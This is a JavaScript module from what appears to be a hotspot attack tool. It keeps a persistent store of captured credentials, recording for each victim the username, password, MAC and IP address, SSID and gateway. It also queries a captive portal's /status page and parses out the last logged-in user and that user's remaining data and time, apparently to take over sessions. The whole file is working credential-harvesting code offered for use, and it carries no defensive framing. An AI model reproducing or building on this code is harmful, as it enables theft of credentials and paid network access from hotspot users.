const fs = require('fs');
const path = require('path');
const axios = require('axios');
const logger = require('../utils/logger');

const DATA_FILE = path.join(__dirname, '..', '..', 'data', 'captured-credentials.json');

let credentials = [];

function ensureDataDir() {
  const dir = path.dirname(DATA_FILE);
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

function loadStore() {
  try {
    ensureDataDir();
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE, 'utf-8');
      credentials = JSON.parse(raw);
      if (!Array.isArray(credentials)) credentials = [];
    }
  } catch (err) {
    logger.error('Failed to load captured credentials', err.message);
    credentials = [];
  }
}

function saveStore() {
  try {
    ensureDataDir();
    fs.writeFileSync(DATA_FILE, JSON.stringify(credentials, null, 2), 'utf-8');
  } catch (err) {
    logger.error('Failed to save captured credentials', err.message);
  }
}

loadStore();

const credentialCapture = {
  getCredentials(limit = 100) {
    return credentials.slice(0, limit);
  },

  addCredential(username, extra = {}) {
    const exists = credentials.some(c => c.username === username && ((Date.now() - new Date(c.capturedAt).getTime()) < 60000));
    if (exists) {
      logger.info(`Skipping duplicate credential: ${username} (captured recently)`);
      return { isSuccess: false, value: null, error: 'Duplicate (captured within 60s)', statusCode: 409 };
    }

    credentials.unshift({
      username,
      domain: extra.domain || '',
      password: extra.password || '',
      source: extra.source || 'manual',
      victimMac: extra.victimMac || '',
      victimIp: extra.victimIp || '',
      ssid: extra.ssid || '',
      gatewayIp: extra.gatewayIp || '',
      remainingBytes: extra.remainingBytes != null ? extra.remainingBytes : null,
      remainingTime: extra.remainingTime != null ? extra.remainingTime : null,
      bytesUsed: extra.bytesUsed != null ? extra.bytesUsed : null,
      ipAddress: extra.ipAddress || '',
      userAgent: extra.userAgent || '',
      capturedAt: new Date().toISOString(),
      forwardedToLogin: extra.forwardedToLogin || false,
      hotspotUrl: extra.hotspotUrl || '',
      extra: extra.extra || null,
    });

    if (credentials.length > 500) {
      credentials = credentials.slice(0, 500);
    }
    saveStore();
    logger.info(`Credential captured: ${username} [source: ${extra.source || 'manual'}]`);
    return { isSuccess: true, value: credentials[0], error: null, statusCode: 201 };
  },

  async fetchLastuser(hotspotUrl) {
    if (!hotspotUrl) return { isSuccess: false, value: null, error: 'No hotspot URL', statusCode: 400 };

    const statusUrl = hotspotUrl.replace(/\/+$/, '').replace(/\/index\.html$/, '') + '/status';
    try {
      const resp = await axios.get(statusUrl, {
        timeout: 5000,
        validateStatus: () => true,
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      });
      const html = typeof resp.data === 'string' ? resp.data : '';
      const lastuser = this.parseLastuser(html);
      const bytes = this.parseVar(html, 'bytes');
      const time = this.parseVar(html, 'time');
      const sessionActive = !!(lastuser || html.includes('remain_bytes_total') || html.includes('تم تسجيل'));

      return {
        isSuccess: true,
        value: {
          lastuser,
          bytes,
          time,
          sessionActive,
          htmlLength: html.length,
          httpStatus: resp.status,
        },
        error: null,
        statusCode: 200,
      };
    } catch (err) {
      return { isSuccess: false, value: null, error: err.message, statusCode: 500 };
    }
  },

  parseLastuser(html) {
    if (!html) return null;
    const match = html.match(/var\s+lastuser\s*=\s*["']([^"']+)["']/);
    return match ? match[1] : null;
  },

  parseVar(html, name) {
    if (!html) return null;
    const match = html.match(new RegExp(`var\\s+${name}\\s*=\\s*["']([^"']+)["']`));
    return match ? match[1] : null;
  },

  parseRemainingBytes(html) {
    const bytes = this.parseVar(html, 'bytes');
    if (bytes) return parseInt(bytes, 10);
    const match = html.match(/<div[^>]*remain_bytes_total[^>]*>([^<]*)</);
    return match ? match[1].trim() : null;
  },

  getStats() {
    return {
      total: credentials.length,
      uniqueUsers: [...new Set(credentials.map(c => c.username))].length,
      recentCount: credentials.filter(c => (Date.now() - new Date(c.capturedAt).getTime()) < 3600000).length,
      sources: [...new Set(credentials.map(c => c.source))],
    };
  },

  clear() {
    credentials = [];
    saveStore();
    return { isSuccess: true, value: null, error: null, statusCode: 200 };
  },
};

module.exports = credentialCapture;
